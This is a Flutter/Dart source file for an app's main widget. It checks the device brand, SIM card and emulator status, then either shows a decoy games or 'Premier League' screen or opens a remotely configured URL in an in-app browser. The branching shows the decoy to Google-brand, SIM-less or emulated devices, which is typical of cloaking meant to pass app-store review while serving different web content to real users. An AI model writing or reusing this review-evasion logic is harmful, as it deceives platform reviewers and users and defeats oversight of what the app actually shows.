import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:valkyrie/services/device_info.dart';
import 'package:valkyrie/services/json_manager.dart';
import 'package:valkyrie/services/remote_config_service.dart';
import 'package:valkyrie/services/storage_manager.dart';
import 'package:valkyrie/services/theme_manager.dart';

import 'dummy_page.dart';
import 'in_app_browser_page.dart';

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;

  String path = "";
  // String path = "https://turbo.az";

  // String? getUrl = '';
  late String brandDevice;
  late bool simDevice;
  late bool physicalPhone;

  @override
  void initState() {
    StorageManager.readData('url').then(
      (value) {
        print('URL value read from storage: ' + value.toString());
        path = value ?? '';
      },
    );

    DeviceInfo.getBrandDevice().then(
      (value) {
        print("What is the brand of the phone? $value");
        brandDevice = value;
      },
    );

    DeviceInfo.getSimInfo().then(
      (value) {
        print("Does phone have sim card ? $value");
        simDevice = value;
      },
    );

    DeviceInfo.getEmulatorInfo().then(
      (value) {
        print("Is it real physical device ? $value");
        physicalPhone = value;
      },
    );

    super.initState();
  }

  //----------------------------------------------------------------------------

  @override
  Widget build(BuildContext context) {
    return Consumer<ThemeNotifier>(builder: (context, theme, _) {
      return MaterialApp(
        title: 'Flutter Demo',
        theme: theme.getTheme(),
        home:
            //! first condition
            path.isEmpty ? loadFire(context) : buildWebView(path),
      );
    });
  }
  //----------------------------------------------------------------------------

  Widget loadFire(
    BuildContext context,
    // String? getUrl,
  ) {
    final dataProvider = Provider.of<DataManager>(context, listen: true);
    String getUrl = dataProvider.url ?? "";
    return FutureBuilder<FirebaseRemoteConfig>(
      future: setupRemoteConfig(),
      builder: (
        BuildContext context,
        AsyncSnapshot<FirebaseRemoteConfig> snapshot,
      ) {
        //! second Condition
        return secondConditionCheckUp(getUrl, snapshot);
      },
    );
  }

  //----------------------------------------------------------------------------

  Widget secondConditionCheckUp(
    String getUrl,
    AsyncSnapshot<FirebaseRemoteConfig> snapshot,
  ) {
    //! Checking second condition
    if ((getUrl.isEmpty || brandDevice.contains("google")) ||
        !simDevice ||
        !physicalPhone) {
      return snapshot.hasData ? GamesPage() : buildLoading();
    } else {
      StorageManager.saveData("url", getUrl);
      return buildWebView(getUrl);
    }
  }

  //----------------------------------------------------------------------------

  Widget buildWebView(String path) {
    return InAppBrowserPage(url: path);
  }

  //----------------------------------------------------------------------------

  Widget buildLoading() {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Premier League'),
      ),
      body: const Center(
        child: CircularProgressIndicator(),
      ),
    );
  }
}
